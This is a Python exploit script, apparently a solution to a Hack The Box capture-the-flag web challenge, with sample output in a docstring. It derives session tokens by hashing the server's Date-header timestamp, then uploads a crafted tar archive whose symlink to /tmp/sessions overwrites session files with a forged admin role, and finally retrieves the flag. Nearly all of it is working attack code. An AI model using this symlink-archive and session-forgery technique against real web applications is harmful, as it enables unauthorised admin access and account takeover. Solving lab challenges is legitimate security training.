import requests as re

BASE_URL = "http://94.237.48.12:31159"
USERNAME = "noexist3"
MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
ARCHIVE_NAME = "payload.tar"
USERNAME2 = "normal3"
PASSWORD2 = "normal3"

def extract_posix_time_from_fake_login():
    from  datetime import datetime, timezone, timedelta

    resp = re.post(f"{BASE_URL}/login", {"username":USERNAME, "password":"dummypassword"})

    [day, mon, year, time, tz] = resp.headers.get("Date").split(",")[1].split()
    [hours, minutes, seconds] = time.split(":")
    mon = MONTHS.index(mon.capitalize()) + 1
    tz = timezone(offset=timedelta(hours=0))

    dt = datetime(int(year), mon, int(day), int(hours), int(minutes), int(seconds), tzinfo=tz)
    posix = int(dt.timestamp())
    
    print(f"THE DATE HEADER: {resp.headers.get('Date')}")
    print(f"THE DATETIME OBJECT: {dt}")
    print(f"THE POSIX TIME: {posix}")

    return posix

def create_malicious_tar(session1:str, session2:str, session3:str):
    from tarfile import TarFile
    import subprocess
    import json

    subprocess.run(["ln", "-s", "/tmp/sessions", "tmp_link3"])
    data = json.dumps({"username":USERNAME, "id":1337,  "role":"admin"})
    f = open(f"malicous_data.txt", "w")
    f.write(data)
    f.close()
    with TarFile("payload.tar", "w") as tarf:
        tarf.add("tmp_link3")
        tarf.add("malicous_data.txt", f"tmp_link3/{USERNAME}/{session1}")
        tarf.add("malicous_data.txt", f"tmp_link3/{USERNAME}/{session2}")
        tarf.add("malicous_data.txt", f"tmp_link3/{USERNAME}/{session3}")

def create_account(session: re.Session):
    data = {
        "username":USERNAME2,
        "password":PASSWORD2
    }
    resp = session.post(f"{BASE_URL}/register", data=data)
    if resp.ok:
        print(f"Successfully created user '{USERNAME}' with password '{PASSWORD2}'")
        return True
    else:
        print(f"Error while creating account for user '{USERNAME}'")
        print(resp.text)
        print()
        return False

def login(session: re.Session):
    data = {
        "username":USERNAME2,
        "password":PASSWORD2
    }
    resp = session.post(f"{BASE_URL}/login", data=data)
    if resp.ok:
        print(f"Successfully loggend in for user '{USERNAME}' with password '{PASSWORD2}'")
        return True
    else:
        print(f"Error while loggin in for user '{USERNAME}'")
        print(resp.text)
        print()
        return False

def upload(session: re.Session):
    files = {'archive': open(ARCHIVE_NAME, 'rb')}
    resp = session.post(f"{BASE_URL}/user/upload", files=files)
    if resp.ok:
        print(f"Successfully uploaded archive!")
        return True
    else:
        print(f"Error while uploading archive!")
        print(resp.text)
        print()
        return False

def get_flag():
    resp = re.get(f"{BASE_URL}/user/admin", cookies={"username":USERNAME, "session": "dummy"})

    if not resp.ok:
        print("ERROR!")
        print(resp.status_code)
        print(resp.text)
        exit(1)

    flag_start = resp.text.find("HTB{")
    flag_end = resp.text.find("}", flag_start)
    flag = resp.text[flag_start:flag_end+1]
    print(flag) 

def main():
    posix =  extract_posix_time_from_fake_login()

    import hashlib
    session1 = hashlib.sha256(str(posix - 1).encode()).digest().hex()
    session2 = hashlib.sha256(str(posix).encode()).digest().hex()
    session3 = hashlib.sha256(str(posix + 1).encode()).digest().hex()

    print(f"THE BEFORE HASH IS {session1}")
    print(f"THE EXACT HASH IS {session2}")
    print(f"THE AFTER HASH IS {session3}")

    create_malicious_tar(session1=session1, session2=session2,session3=session3)

    session = re.Session()

    create_account(session)
    assert(login(session))
    assert(upload(session))
    
    get_flag()

    """
    THE DATE HEADER: Wed, 10 Sep 2025 05:18:52 GMT
    THE DATETIME OBJECT: 2025-09-10 05:18:52+00:00
    THE POSIX TIME: 1757481532
    THE BEFORE HASH IS 4c01714a02038114946d2f8952814f749ed2eb843d083afa904fc5780f630831
    THE EXACT HASH IS 3b6386057e113b045176070be22e43d0f50a844a8447d53dbfd206080e99448c
    THE AFTER HASH IS 9230696dca32091b7be0cc8256076c4ce5a3b060d3917a9f5a3d15c00c653419
    Successfully created user 'noexist3' with password 'normal3'
    Successfully loggend in for user 'noexist3' with password 'normal3'
    Successfully uploaded archive!
    HTB{flag}
    """



if __name__ == "__main__":
    main()